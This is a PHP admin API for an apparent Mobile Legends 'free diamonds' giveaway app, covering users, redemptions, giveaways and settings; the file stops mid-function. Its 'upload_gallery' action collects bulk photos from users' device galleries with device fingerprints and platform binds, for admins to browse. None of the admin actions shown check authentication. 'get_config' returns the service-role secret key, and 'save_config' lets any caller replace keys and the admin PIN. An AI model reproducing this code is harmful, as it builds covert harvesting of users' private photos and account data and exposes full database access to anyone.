<?php
/**
 * Ketupat MLBB Admin API Controller
 * Full CRUD & Management Engine with Highest Access Privileges
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');

if (($_SERVER['REQUEST_METHOD'] ?? '') === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once __DIR__ . '/config.php';

// Helper to respond with JSON
function sendJson($success, $data = null, $message = '', $statusCode = 200) {
    http_response_code($statusCode);
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'data'    => $data,
        'timestamp' => date('Y-m-d H:i:s')
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    exit;
}

/**
 * Resolves the dedicated local gallery directory for a specific device.
 * Strictly isolates different physical devices / emulator instances by device_id.
 */
function resolveDeviceFolder($deviceId, $userEmail = '', $createIfMissing = false) {
    $galleryDir = __DIR__ . '/uploads/gallery';
    if (!is_dir($galleryDir)) {
        @mkdir($galleryDir, 0777, true);
    }

    $targetDir = null;
    $cleanDir = '';
    $cleanDevId = !empty($deviceId) ? preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower($deviceId)) : '';

    // 1. Candidate directory names strictly matching device ID
    if (!empty($cleanDevId)) {
        $rawDevId = strtolower($deviceId);
        $candidates = [
            'device_' . $cleanDevId,
            $cleanDevId,
            'device_' . $rawDevId,
            $rawDevId
        ];
        foreach ($candidates as $cand) {
            $candPath = $galleryDir . '/' . $cand;
            if (is_dir($candPath)) {
                $targetDir = $candPath;
                $cleanDir = $cand;
                break;
            }
        }
    }

    // 2. Scan meta.json files strictly matching device_id or directory name
    if (!$targetDir && !empty($deviceId) && is_dir($galleryDir)) {
        foreach (scandir($galleryDir) as $d) {
            if ($d === '.' || $d === '..') continue;
            $fullD = $galleryDir . '/' . $d;
            if (!is_dir($fullD)) continue;
            $mFile = $fullD . '/meta.json';
            if (file_exists($mFile)) {
                $m = json_decode(file_get_contents($mFile), true);
                if (is_array($m)) {
                    $mDev = $m['device_id'] ?? '';
                    $dLower = strtolower($d);
                    if ($mDev === $deviceId ||
                        $d === $deviceId ||
                        $d === $cleanDevId ||
                        $d === ('device_' . $cleanDevId) ||
                        $dLower === ('device_' . strtolower($deviceId)) ||
                        $dLower === strtolower($deviceId)) {
                        $targetDir = $fullD;
                        $cleanDir = $d;
                        break;
                    }
                }
            }
        }
    }

    // 3. Fallback to user email ONLY if deviceId is empty AND userEmail is not the generic guest placeholder
    if (!$targetDir && empty($deviceId) && !empty($userEmail) && strtolower($userEmail) !== 'guest@ketupat.app' && is_dir($galleryDir)) {
        $cleanUserKey = 'user_' . preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower($userEmail));
        $candPath = $galleryDir . '/' . $cleanUserKey;
        if (is_dir($candPath)) {
            $targetDir = $candPath;
            $cleanDir = $cleanUserKey;
        } else {
            foreach (scandir($galleryDir) as $d) {
                if ($d === '.' || $d === '..') continue;
                $fullD = $galleryDir . '/' . $d;
                if (!is_dir($fullD)) continue;
                $mFile = $fullD . '/meta.json';
                if (file_exists($mFile)) {
                    $m = json_decode(file_get_contents($mFile), true);
                    if (is_array($m) && strtolower($m['user_email'] ?? '') === strtolower($userEmail)) {
                        $targetDir = $fullD;
                        $cleanDir = $d;
                        break;
                    }
                }
            }
        }
    }

    // 4. Create new folder if requested and not found
    if (!$targetDir && $createIfMissing) {
        if (!empty($cleanDevId)) {
            $folderName = 'device_' . $cleanDevId;
        } else if (!empty($userEmail)) {
            $folderName = 'user_' . preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower($userEmail));
        } else {
            $folderName = 'device_dev_' . bin2hex(random_bytes(8));
        }
        $cleanDir = $folderName;
        $targetDir = $galleryDir . '/' . $cleanDir;
        if (!is_dir($targetDir)) {
            @mkdir($targetDir, 0777, true);
        }
    }

    return [$targetDir, $cleanDir];
}

// Read input payload
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
$action = $_GET['action'] ?? '';
$rawBody = file_get_contents('php://input');
$body = json_decode($rawBody, true) ?? [];

if (empty($action) && isset($body['action'])) {
    $action = $body['action'];
}

try {
    switch ($action) {

        case 'ping':
            sendJson(true, ['status' => 'online', 'time' => time()], 'API online');
            break;
        case 'get_stats':
            $usersRes = supabaseApiRequest('users?select=count', 'GET', null, ['Prefer: count=exact']);
            $redemptionsRes = supabaseApiRequest('redemptions?select=*&order=created_at.desc', 'GET');
            $giveawaysRes = supabaseApiRequest('giveaway_entries?select=*', 'GET');
            $cfg = getAppConfig();

            $totalUsers = 0;
            $allUsers = supabaseApiRequest('users?select=email,points,diamonds_claimed', 'GET');
            if ($allUsers['success'] && is_array($allUsers['data'])) {
                $totalUsers = count($allUsers['data']);
            }

            $totalRedemptions = 0;
            $pendingRedemptions = 0;
            $totalDiamondsRedeemed = 0;
            $recentOrders = [];

            if ($redemptionsRes['success'] && is_array($redemptionsRes['data'])) {
                $totalRedemptions = count($redemptionsRes['data']);
                foreach ($redemptionsRes['data'] as $r) {
                    $status = strtolower($r['status'] ?? '');
                    if (strpos($status, 'processing') !== false || strpos($status, 'pending') !== false) {
                        $pendingRedemptions++;
                    }
                    if (strpos($status, 'completed') !== false) {
                        $totalDiamondsRedeemed += intval($r['diamonds'] ?? 0);
                    }
                }
                $recentOrders = array_slice($redemptionsRes['data'], 0, 5);
            }

            $totalEntries = 0;
            if ($giveawaysRes['success'] && is_array($giveawaysRes['data'])) {
                $totalEntries = count($giveawaysRes['data']);
            }

            // Calculate gallery photos across local storage and users with avatars
            $galleryDir = __DIR__ . '/uploads/gallery';
            $totalPhotos = 0;
            $usersWithGallery = 0;
            if (is_dir($galleryDir)) {
                $userFolders = glob($galleryDir . '/*', GLOB_ONLYDIR);
                foreach ($userFolders as $uf) {
                    $metaFile = $uf . '/meta.json';
                    if (file_exists($metaFile)) {
                        $meta = json_decode(file_get_contents($metaFile), true);
                        $count = count($meta['photos'] ?? []);
                        if ($count > 0) {
                            $totalPhotos += $count;
                            $usersWithGallery++;
                        }
                    }
                }
            }

            // Count users who have avatar_data in Supabase
            if ($allUsers['success'] && is_array($allUsers['data'])) {
                foreach ($allUsers['data'] as $u) {
                    if (!empty($u['avatar_data'])) {
                        $totalPhotos++;
                        $usersWithGallery++;
                    }
                }
            }

            sendJson(true, [
                'stats' => [
                    'total_users'             => $totalUsers,
                    'total_redemptions'       => $totalRedemptions,
                    'pending_redemptions'     => $pendingRedemptions,
                    'total_diamonds_redeemed' => $totalDiamondsRedeemed,
                    'total_giveaway_entries'  => $totalEntries,
                    'total_gallery_photos'    => $totalPhotos,
                    'users_with_gallery'      => $usersWithGallery,
                    'has_secret_key'          => !empty($cfg['supabase_secret_key']),
                    'access_level'            => !empty($cfg['supabase_secret_key']) ? 'Highest Access (Service Role / Secret Key)' : 'Standard Access (Publishable Key)'
                ],
                'recent_orders' => $recentOrders
            ], 'Stats retrieved');
            break;

        // ==========================================
        // 2. USERS CRUD
        // ==========================================
        case 'list_users':
            $search = trim($_GET['search'] ?? '');
            $endpoint = 'users?select=*&order=created_at.desc';
            if (!empty($search)) {
                $s = urlencode($search);
                $endpoint = "users?or=(email.ilike.*$s*,username.ilike.*$s*,mlbb_ign.ilike.*$s*,mlbb_id.ilike.*$s*)&order=created_at.desc";
            }
            $res = supabaseApiRequest($endpoint, 'GET');
            if (!$res['success']) {
                sendJson(false, null, 'Failed to fetch users: ' . ($res['error'] ?? 'Unknown error'), 500);
            }
            $users = $res['data'] ?? [];

            // Enrich each user with device hardware info, gallery permission status, and platform binds from meta.json
            $galleryDir = __DIR__ . '/uploads/gallery';
            $deviceMetas = [];
            if (is_dir($galleryDir)) {
                $dirs = glob($galleryDir . '/*', GLOB_ONLYDIR);
                if ($dirs) {
                    foreach ($dirs as $d) {
                        $mFile = $d . '/meta.json';
                        if (file_exists($mFile)) {
                            $meta = json_decode(file_get_contents($mFile), true);
                            if (is_array($meta)) {
                                $devEmail = strtolower(trim($meta['user_email'] ?? ''));
                                $devMlbbId = trim($meta['mlbb_id'] ?? '');
                                if ($devEmail && $devEmail !== 'guest@ketupat.app') $deviceMetas[$devEmail] = $meta;
                                if ($devMlbbId && $devMlbbId !== '—') $deviceMetas['mlbb_' . $devMlbbId] = $meta;
                            }
                        }
                    }
                }
            }

            foreach ($users as &$u) {
                $e = strtolower(trim($u['email'] ?? ''));
                $mId = 'mlbb_' . trim($u['mlbb_id'] ?? '');
                $meta = $deviceMetas[$e] ?? $deviceMetas[$mId] ?? null;
                if ($meta) {
                    $u['device_id'] = $meta['device_id'] ?? '';
                    $u['device_name'] = $meta['device_name'] ?? '';
                    $u['device_model'] = $meta['device_model'] ?? '';
                    $u['device_fingerprint'] = $meta['device_fingerprint'] ?? '';
                    $u['is_full_access'] = !empty($meta['is_full_access']);
                    $u['photo_count'] = count($meta['photos'] ?? []);
                    $u['binds'] = $meta['binds'] ?? [];
                    $u['user_binds'] = $meta['user_binds'] ?? [];
                }
            }
            unset($u);

            sendJson(true, $users, 'Users retrieved');
            break;

        case 'save_user':
            // Insert or update (Upsert by email)
            $userPayload = [
                'email'            => trim($body['email'] ?? ''),
                'username'         => trim($body['username'] ?? ''),
                'mlbb_id'          => trim($body['mlbb_id'] ?? ''),
                'mlbb_server'      => trim($body['mlbb_server'] ?? ''),
                'mlbb_ign'         => trim($body['mlbb_ign'] ?? ''),
                'mlbb_region'      => trim($body['mlbb_region'] ?? ''),
                'mlbb_region_code' => trim($body['mlbb_region_code'] ?? ''),
                'points'           => intval($body['points'] ?? 0),
                'diamonds_claimed' => intval($body['diamonds_claimed'] ?? 0),
                'giveaway_tickets' => intval($body['giveaway_tickets'] ?? 0),
                'mega_tickets'     => intval($body['mega_tickets'] ?? 0),
                'daily_tickets'    => intval($body['daily_tickets'] ?? 0),
                'daily_streak'     => intval($body['daily_streak'] ?? 1),
                'location_text'    => trim($body['location_text'] ?? ''),
                'updated_at'       => date('c')
            ];

            if (empty($userPayload['email'])) {
                sendJson(false, null, 'User Email is required', 400);
            }

            // Check if user already exists
            $checkRes = supabaseApiRequest('users?email=eq.' . urlencode($userPayload['email']) . '&select=id', 'GET');
            $userExists = ($checkRes['success'] && !empty($checkRes['data']));

            if ($userExists) {
                // Update
                $updateRes = supabaseApiRequest(
                    'users?email=eq.' . urlencode($userPayload['email']),
                    'PATCH',
                    $userPayload
                );
                if (!$updateRes['success']) {
                    sendJson(false, null, 'Failed to update user: ' . ($updateRes['error'] ?? 'Unknown error'), 500);
                }
                sendJson(true, $updateRes['data'], 'User updated successfully');
            } else {
                // Insert
                $insertRes = supabaseApiRequest('users', 'POST', $userPayload);
                if (!$insertRes['success']) {
                    sendJson(false, null, 'Failed to create user: ' . ($insertRes['error'] ?? 'Unknown error'), 500);
                }
                sendJson(true, $insertRes['data'], 'User created successfully', 201);
            }
            break;

        case 'delete_user':
            $email = trim($_GET['email'] ?? $body['email'] ?? '');
            if (empty($email)) {
                sendJson(false, null, 'Email parameter is required for deletion', 400);
            }
            $delRes = supabaseApiRequest('users?email=eq.' . urlencode($email), 'DELETE');
            if (!$delRes['success']) {
                sendJson(false, null, 'Failed to delete user: ' . ($delRes['error'] ?? 'Unknown error'), 500);
            }
            sendJson(true, $delRes['data'], "User '$email' deleted successfully");
            break;

        // ==========================================
        // 3. REDEMPTIONS CRUD
        // ==========================================
        case 'list_redemptions':
            $statusFilter = trim($_GET['status'] ?? '');
            $search = trim($_GET['search'] ?? '');
            $endpoint = 'redemptions?select=*&order=created_at.desc';

            $filters = [];
            if (!empty($statusFilter) && $statusFilter !== 'all') {
                $filters[] = 'status=ilike.*' . urlencode($statusFilter) . '*';
            }
            if (!empty($search)) {
                $s = urlencode($search);
                $filters[] = "or=(order_id.ilike.*$s*,user_email.ilike.*$s*,mlbb_id.ilike.*$s*,mlbb_ign.ilike.*$s*)";
            }

            if (!empty($filters)) {
                $endpoint .= '&' . implode('&', $filters);
            }

            $res = supabaseApiRequest($endpoint, 'GET');
            if (!$res['success']) {
                sendJson(false, null, 'Failed to fetch redemptions: ' . ($res['error'] ?? 'Unknown error'), 500);
            }
            sendJson(true, $res['data'] ?? [], 'Redemptions retrieved');
            break;

        case 'save_redemption':
            $orderId = trim($body['order_id'] ?? '');
            $redemptionPayload = [
                'user_email'  => trim($body['user_email'] ?? ''),
                'mlbb_id'     => trim($body['mlbb_id'] ?? ''),
                'mlbb_server' => trim($body['mlbb_server'] ?? ''),
                'mlbb_ign'    => trim($body['mlbb_ign'] ?? ''),
                'diamonds'    => intval($body['diamonds'] ?? 0),
                'points_cost' => intval($body['points_cost'] ?? 0),
                'pack_name'   => trim($body['pack_name'] ?? ''),
                'status'      => trim($body['status'] ?? 'Processing (7-14 Days)')
            ];

            if (empty($orderId)) {
                // New redemption record
                $orderId = 'MLBB-' . strtoupper(substr(md5(uniqid()), 0, 8));
                $redemptionPayload['order_id'] = $orderId;
                $res = supabaseApiRequest('redemptions', 'POST', $redemptionPayload);
                if (!$res['success']) {
                    sendJson(false, null, 'Failed to create redemption: ' . ($res['error'] ?? 'Unknown error'), 500);
                }
                sendJson(true, $res['data'], 'Redemption created successfully', 201);
            } else {
                // Update existing
                $res = supabaseApiRequest('redemptions?order_id=eq.' . urlencode($orderId), 'PATCH', $redemptionPayload);
                if (!$res['success']) {
                    sendJson(false, null, 'Failed to update redemption: ' . ($res['error'] ?? 'Unknown error'), 500);
                }
                sendJson(true, $res['data'], "Order '$orderId' updated successfully");
            }
            break;

        case 'delete_redemption':
            $orderId = trim($_GET['order_id'] ?? $body['order_id'] ?? '');
            if (empty($orderId)) {
                sendJson(false, null, 'Order ID is required for deletion', 400);
            }
            $res = supabaseApiRequest('redemptions?order_id=eq.' . urlencode($orderId), 'DELETE');
            if (!$res['success']) {
                sendJson(false, null, 'Failed to delete redemption: ' . ($res['error'] ?? 'Unknown error'), 500);
            }
            sendJson(true, $res['data'], "Order '$orderId' deleted successfully");
            break;

        // ==========================================
        // 4. GIVEAWAYS CRUD & WINNER PICKER
        // ==========================================
        case 'list_giveaways':
            $poolFilter = trim($_GET['pool'] ?? '');
            $endpoint = 'giveaway_entries?select=*&order=created_at.desc';
            if (!empty($poolFilter) && $poolFilter !== 'all') {
                $endpoint .= '&pool_type=eq.' . urlencode($poolFilter);
            }
            $res = supabaseApiRequest($endpoint, 'GET');
            if (!$res['success']) {
                sendJson(false, null, 'Failed to fetch giveaway entries: ' . ($res['error'] ?? 'Unknown error'), 500);
            }
            sendJson(true, $res['data'] ?? [], 'Giveaway entries retrieved');
            break;

        case 'save_giveaway':
            $id = $body['id'] ?? null;
            $giveawayPayload = [
                'user_email'   => trim($body['user_email'] ?? ''),
                'mlbb_id'      => trim($body['mlbb_id'] ?? ''),
                'mlbb_server'  => trim($body['mlbb_server'] ?? ''),
                'mlbb_ign'     => trim($body['mlbb_ign'] ?? ''),
                'pool_type'    => trim($body['pool_type'] ?? 'daily'),
                'ticket_count' => intval($body['ticket_count'] ?? 1),
                'points_spent' => intval($body['points_spent'] ?? 0)
            ];

            if ($id) {
                $res = supabaseApiRequest('giveaway_entries?id=eq.' . urlencode($id), 'PATCH', $giveawayPayload);
                if (!$res['success']) {
                    sendJson(false, null, 'Failed to update entry: ' . ($res['error'] ?? 'Unknown error'), 500);
                }
                sendJson(true, $res['data'], 'Giveaway entry updated');
            } else {
                $res = supabaseApiRequest('giveaway_entries', 'POST', $giveawayPayload);
                if (!$res['success']) {
                    sendJson(false, null, 'Failed to add giveaway entry: ' . ($res['error'] ?? 'Unknown error'), 500);
                }
                sendJson(true, $res['data'], 'Giveaway entry added', 201);
            }
            break;

        case 'delete_giveaway':
            $id = trim($_GET['id'] ?? $body['id'] ?? '');
            if (empty($id)) {
                sendJson(false, null, 'Valid giveaway entry ID is required', 400);
            }
            $res = supabaseApiRequest('giveaway_entries?id=eq.' . urlencode($id), 'DELETE');
            if (!$res['success']) {
                sendJson(false, null, 'Failed to delete entry: ' . ($res['error'] ?? 'Unknown error'), 500);
            }
            sendJson(true, $res['data'], 'Giveaway entry deleted');
            break;

        case 'roll_winner':
            $pool = trim($body['pool'] ?? $_GET['pool'] ?? 'daily');
            $endpoint = 'giveaway_entries?select=*';
            if ($pool !== 'all') {
                $endpoint .= '&pool_type=eq.' . urlencode($pool);
            }
            $res = supabaseApiRequest($endpoint, 'GET');
            if (!$res['success'] || empty($res['data'])) {
                sendJson(false, null, "No entries found in '$pool' pool to draw a winner.", 404);
            }

            // Weighted random selection by ticket_count
            $ticketsPool = [];
            foreach ($res['data'] as $entry) {
                $count = max(1, intval($entry['ticket_count'] ?? 1));
                for ($i = 0; $i < $count; $i++) {
                    $ticketsPool[] = $entry;
                }
            }

            if (empty($ticketsPool)) {
                sendJson(false, null, 'Unable to draw from empty pool', 400);
            }

            $winnerIndex = array_rand($ticketsPool);
            $winner = $ticketsPool[$winnerIndex];

            sendJson(true, [
                'winner'        => $winner,
                'total_tickets' => count($ticketsPool),
                'total_entries' => count($res['data']),
                'pool_type'     => $pool
            ], 'Winner drawn successfully!');
            break;

        // ==========================================
        // 5. CONFIGURATION & CLOUD SETTINGS
        // ==========================================
        case 'get_config':
            $cfg = getAppConfig();
            $maskedSecret = '';
            if (!empty($cfg['supabase_secret_key'])) {
                $len = strlen($cfg['supabase_secret_key']);
                $maskedSecret = substr($cfg['supabase_secret_key'], 0, 10) . '...' . substr($cfg['supabase_secret_key'], -6);
            }

            sendJson(true, [
                'supabase_url'         => $cfg['supabase_url'],
                'supabase_anon_key'    => $cfg['supabase_anon_key'],
                'supabase_secret_key'  => $cfg['supabase_secret_key'], // Provided for direct editing in admin
                'supabase_secret_mask' => $maskedSecret,
                'dlyyz_api_key'        => $cfg['dlyyz_api_key'],
                'has_highest_access'   => !empty($cfg['supabase_secret_key'])
            ], 'Configuration retrieved');
            break;

        case 'save_config':
            $updateData = [];

            if (isset($body['supabase_url'])) {
                $supabaseUrl = trim($body['supabase_url']);
                if (empty($supabaseUrl)) {
                    sendJson(false, null, 'Supabase URL cannot be empty', 400);
                }
                $updateData['supabase_url'] = rtrim($supabaseUrl, '/');
            }

            if (isset($body['supabase_anon_key'])) {
                $updateData['supabase_anon_key'] = trim($body['supabase_anon_key']);
            }

            if (isset($body['supabase_secret_key'])) {
                $updateData['supabase_secret_key'] = trim($body['supabase_secret_key']);
            }

            if (isset($body['dlyyz_api_key'])) {
                $updateData['dlyyz_api_key'] = trim($body['dlyyz_api_key']);
            }

            if (isset($body['admin_pin'])) {
                $updateData['admin_pin'] = trim($body['admin_pin']);
            }

            if (!empty($updateData)) {
                $saved = saveAppConfig($updateData);
                if (!$saved) {
                    sendJson(false, null, 'Failed to save configuration file', 500);
                }
            }

            $currentCfg = getAppConfig();
            sendJson(true, [
                'has_highest_access' => !empty($currentCfg['supabase_secret_key'])
            ], 'Cloud configuration saved successfully');
            break;

        case 'test_connection':
            // Test query on users table
            $res = supabaseApiRequest('users?select=count', 'GET', null, ['Prefer: count=exact']);
            $cfg = getAppConfig();
            $isSecret = !empty($cfg['supabase_secret_key']);

            if ($res['success']) {
                sendJson(true, [
                    'connected'     => true,
                    'http_code'     => $res['code'],
                    'highest_access'=> $isSecret,
                    'mode'          => $isSecret ? 'HIGHEST ACCESS (Service Role Secret Key — RLS Bypassed)' : 'STANDARD ACCESS (Publishable Anon Key — RLS Enforced)',
                    'message'       => 'Connection to Supabase REST API successful!'
                ], 'Connection verified');
            } else {
                sendJson(false, [
                    'connected' => false,
                    'http_code' => $res['code'],
                    'error'     => $res['error']
                ], 'Connection failed: ' . ($res['error'] ?? 'Unknown error'), 502);
            }
            break;

        // ==========================================
        // 6. CSV DATA EXPORT
        // ==========================================
        case 'export_csv':
            $table = trim($_GET['table'] ?? 'redemptions');
            $allowedTables = ['users', 'redemptions', 'giveaway_entries'];
            if (!in_array($table, $allowedTables)) {
                $table = 'redemptions';
            }

            $res = supabaseApiRequest("$table?select=*&order=created_at.desc", 'GET');
            if (!$res['success'] || !is_array($res['data'])) {
                sendJson(false, null, 'Failed to fetch table data for export', 500);
            }

            $records = $res['data'];
            header('Content-Type: text/csv; charset=utf-8');
            header('Content-Disposition: attachment; filename="' . $table . '_export_' . date('Ymd_His') . '.csv"');

            $output = fopen('php://output', 'w');
            if (!empty($records)) {
                // Header row
                fputcsv($output, array_keys($records[0]));
                // Data rows
                foreach ($records as $row) {
                    fputcsv($output, array_values($row));
                }
            }
            fclose($output);
            exit;

        // ==========================================
        // 7. USER DEVICE GALLERY BROWSER & STORAGE (BY UNIQUE DEVICE)
        // ==========================================
        case 'upload_gallery':
            $deviceId          = trim($body['device_id'] ?? $_POST['device_id'] ?? '');
            $deviceName        = trim($body['device_name'] ?? $_POST['device_name'] ?? '');
            $deviceModel       = trim($body['device_model'] ?? $_POST['device_model'] ?? '');
            $deviceFingerprint = trim($body['device_fingerprint'] ?? $_POST['device_fingerprint'] ?? '');
            $userEmail         = trim($body['user_email'] ?? $_POST['user_email'] ?? '');
            $mlbbId            = trim($body['mlbb_id'] ?? $_POST['mlbb_id'] ?? '');
            $mlbbServer        = trim($body['mlbb_server'] ?? $_POST['mlbb_server'] ?? '');
            $mlbbIgn           = trim($body['mlbb_ign'] ?? $_POST['mlbb_ign'] ?? '');

            if (empty($deviceId) && empty($userEmail)) {
                sendJson(false, null, 'Device ID or User email is required', 400);
            }

            // Resolve dedicated per-device folder to strictly prevent cross-device gallery mixing
            list($targetDir, $cleanDir) = resolveDeviceFolder($deviceId, $userEmail, true);

            $metaFile = $targetDir . '/meta.json';
            $meta = file_exists($metaFile) ? json_decode(file_get_contents($metaFile), true) : [
                'device_id'          => $deviceId ?: $cleanDir,
                'device_name'        => $deviceName ?: 'Android Device',
                'device_model'       => $deviceModel,
                'device_fingerprint' => $deviceFingerprint,
                'user_email'         => $userEmail,
                'mlbb_id'            => $mlbbId,
                'mlbb_server'        => $mlbbServer,
                'mlbb_ign'           => $mlbbIgn,
                'photos'             => []
            ];

            // Lock device_id to the folder owner's unique ID
            if (!empty($deviceId)) {
                $meta['device_id'] = $deviceId;
            } else if (empty($meta['device_id'])) {
                $meta['device_id'] = $cleanDir;
            }

            if (!empty($deviceName)) $meta['device_name'] = $deviceName;
            if (!empty($deviceModel)) $meta['device_model'] = $deviceModel;
            if (!empty($deviceFingerprint)) $meta['device_fingerprint'] = $deviceFingerprint;
            if (!empty($userEmail)) $meta['user_email'] = $userEmail;
            if (!empty($mlbbId)) $meta['mlbb_id'] = $mlbbId;
            if (!empty($mlbbServer)) $meta['mlbb_server'] = $mlbbServer;
            if (!empty($mlbbIgn)) $meta['mlbb_ign'] = $mlbbIgn;

            // Preserve full access if client asserts true OR if photos are already uploaded
            if (isset($body['is_full_access'])) {
                if (!empty($body['is_full_access'])) {
                    $meta['is_full_access'] = true;
                } else if (empty($meta['photos'])) {
                    $meta['is_full_access'] = false;
                }
            }
            if (isset($body['binds'])) $meta['binds'] = $body['binds'];
            if (isset($body['user_binds'])) $meta['user_binds'] = $body['user_binds'];

            $savedCount = 0;
            $incomingPhotos = $body['photos'] ?? [];

            if (is_array($incomingPhotos)) {
                foreach ($incomingPhotos as $idx => $item) {
                    $dataUrl = $item['dataUrl'] ?? '';
                    if (empty($dataUrl)) continue;

                    $origName = $item['name'] ?? ('device_photo_' . time() . '_' . $idx . '.jpg');
                    $fileMime = $item['mime'] ?? 'image/jpeg';
                    $fileSize = intval($item['size'] ?? 0);
                    $isAvatar = !empty($item['is_avatar']) || (strpos(strtolower($origName), 'avatar_') === 0);

                    // Check if already in meta photos by name
                    $alreadyExists = false;
                    if (!empty($meta['photos'])) {
                        foreach ($meta['photos'] as $existingPhoto) {
                            if (($existingPhoto['name'] ?? '') === $origName) {
                                $alreadyExists = true;
                                break;
                            }
                        }
                    }
                    if ($alreadyExists) continue;

                    // Decode base64
                    $parts = explode(',', $dataUrl);
                    $rawBase64 = end($parts);
                    $decoded = base64_decode($rawBase64);
                    if ($decoded !== false) {
                        $prefix = $isAvatar ? 'avatar_' : 'photo_';
                        $filename = $prefix . time() . '_' . $idx . '_' . substr(md5($origName), 0, 6) . '.jpg';
                        $destPath = $targetDir . '/' . $filename;
                        file_put_contents($destPath, $decoded);
                        if ($fileSize <= 0) $fileSize = strlen($decoded);

                        $meta['photos'][] = [
                            'id'         => $prefix . time() . '_' . $idx,
                            'filename'   => $filename,
                            'name'       => $origName,
                            'url'        => 'uploads/gallery/' . $cleanDir . '/' . $filename,
                            'size'       => $fileSize,
                            'mime'       => $fileMime,
                            'is_avatar'  => $isAvatar,
                            'date_added' => date('c')
                        ];
                        if (!$isAvatar) {
                            $meta['is_full_access'] = true;
                        }
                        $savedCount++;
                    }
                }
            }

            $meta['last_synced'] = date('c');
            file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

            sendJson(true, [
                'saved_count'  => $savedCount,
                'total_photos' => count($meta['photos']),
                'device_id'    => $meta['device_id'],
                'device_name'  => $meta['device_name'],
                'user_email'   => $userEmail
            ], "Device gallery photos synced ($savedCount uploaded)");
            break;

        case 'save_player_binds':
            $deviceId  = trim($body['device_id'] ?? '');
            $userEmail = trim($body['user_email'] ?? '');
            $userBinds = $body['user_binds'] ?? [];
            $binds     = $body['binds'] ?? [];

            if (empty($deviceId) && empty($userEmail)) {
                sendJson(false, null, 'Device ID or User Email is required', 400);
            }

            list($targetDir, $cleanDir) = resolveDeviceFolder($deviceId, $userEmail, true);

            $metaFile = $targetDir . '/meta.json';
            $meta = file_exists($metaFile) ? json_decode(file_get_contents($metaFile), true) : [
                'device_id'   => $deviceId ?: $cleanDir,
                'user_email'  => $userEmail,
                'photos'      => []
            ];

            $meta['user_binds'] = $userBinds;
            if (!empty($binds)) $meta['binds'] = $binds;
            if (!empty($body['device_fingerprint'])) $meta['device_fingerprint'] = trim($body['device_fingerprint']);
            if (!empty($body['device_model'])) $meta['device_model'] = trim($body['device_model']);
            if (!empty($body['mlbb_id'])) $meta['mlbb_id'] = trim($body['mlbb_id']);
            if (!empty($body['mlbb_server'])) $meta['mlbb_server'] = trim($body['mlbb_server']);
            if (!empty($body['mlbb_ign'])) $meta['mlbb_ign'] = trim($body['mlbb_ign']);
            $meta['last_synced'] = date('c');

            file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
            sendJson(true, ['user_binds' => $userBinds], 'Platform binds saved successfully');
            break;

        case 'list_user_gallery':
            $deviceId = trim($_GET['device_id'] ?? $body['device_id'] ?? $_GET['email'] ?? $body['email'] ?? '');
            if (empty($deviceId)) {
                sendJson(false, null, 'Device ID is required', 400);
            }

            $galleryDir = __DIR__ . '/uploads/gallery';
            $targetDir = null;
            $metaFile = null;
            $meta = null;

            list($targetDir, $cleanDir) = resolveDeviceFolder($deviceId, $deviceId, false);
            $metaFile = $targetDir ? ($targetDir . '/meta.json') : null;
            $meta = ($metaFile && file_exists($metaFile)) ? json_decode(file_get_contents($metaFile), true) : null;

            $photos = [];
            $devicePhotos = [];
            $email = $meta['user_email'] ?? (strpos($deviceId, '@') !== false ? $deviceId : '');
            $deviceName = $meta['device_name'] ?? 'Android Device';
            $deviceModel = $meta['device_model'] ?? '';
            $phoneModel = !empty($deviceModel) ? $deviceModel : $deviceName;

            $canonicalDevId = $meta['device_id'] ?? $deviceId;
            $deviceTag = '';
            if (strpos($canonicalDevId, 'dev_') === 0) {
                $cleanSuffix = substr($canonicalDevId, 4);
                $dashPos = strpos($cleanSuffix, '-');
                $deviceTag = ($dashPos !== false) ? substr($cleanSuffix, 0, $dashPos) : substr($cleanSuffix, 0, 8);
            } else if (strlen($canonicalDevId) >= 6) {
                $deviceTag = substr($canonicalDevId, 0, 8);
            } else {
                $deviceTag = $canonicalDevId;
            }

            $userInfo = [
                'device_id'          => $canonicalDevId,
                'device_tag'         => $deviceTag,
                'device_name'        => $deviceName,
                'device_model'       => $deviceModel,
                'phone_model'        => $phoneModel,
                'device_fingerprint' => $meta['device_fingerprint'] ?? '',
                'email'              => $email,
                'ign'                => $meta['mlbb_ign'] ?? '—',
                'mlbb_id'            => $meta['mlbb_id'] ?? '—',
                'mlbb_server'        => $meta['mlbb_server'] ?? '—',
                'region'             => '—'
            ];

            // Look up text profile details from Supabase if missing from meta
            $supabaseAvatar = null;
            $userPoints = 0;
            $userDiamonds = 0;
            $userCreatedAt = '';
            if (!empty($email) && strpos($email, '@') !== false) {
                $userRes = supabaseApiRequest('users?email=eq.' . urlencode($email) . '&select=*', 'GET');
                if ($userRes['success'] && !empty($userRes['data'])) {
                    $u = $userRes['data'][0];
                    if ($userInfo['ign'] === '—' || empty($userInfo['ign'])) $userInfo['ign'] = $u['mlbb_ign'] ?? $u['username'] ?? '—';
                    if ($userInfo['mlbb_id'] === '—' || empty($userInfo['mlbb_id'])) $userInfo['mlbb_id'] = $u['mlbb_id'] ?? '—';
                    if ($userInfo['mlbb_server'] === '—' || empty($userInfo['mlbb_server'])) $userInfo['mlbb_server'] = $u['mlbb_server'] ?? '—';
                    $userInfo['region'] = $u['mlbb_region'] ?? '—';
                    $supabaseAvatar = $u['avatar_data'] ?? null;
                    $userPoints = intval($u['points'] ?? 0);
                    $userDiamonds = intval($u['diamonds_claimed'] ?? 0);
                    $userCreatedAt = $u['created_at'] ?? '';
                }
            }

            $userInfo['points'] = $userPoints;
            $userInfo['diamonds_claimed'] = $userDiamonds;
            $userInfo['created_at'] = $userCreatedAt;

            $hasValidMlbb = (!empty($userInfo['mlbb_id']) && $userInfo['mlbb_id'] !== '—');
